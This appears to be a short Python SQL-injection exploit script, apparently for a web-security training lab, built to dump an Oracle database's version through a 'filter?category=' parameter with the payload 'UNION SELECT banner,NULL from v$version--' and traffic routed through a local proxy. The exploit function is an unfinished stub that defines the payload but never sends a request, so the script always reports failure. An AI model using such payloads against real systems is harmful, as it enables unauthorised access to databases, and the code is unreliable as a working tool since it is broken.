import requests
import sys
import urllib3


import pyfiglet

# Display a banner using pyfiglet
ascii_banner = pyfiglet.figlet_format("RuhanSec")
print(ascii_banner)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_version(url):
    path = 'filter?category=Lifestyle'
    sql_payload = 'UNION SELECT banner,NULL from v$version--' #we must use the oracle format
    
if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("[-] unable to dump the database version...")
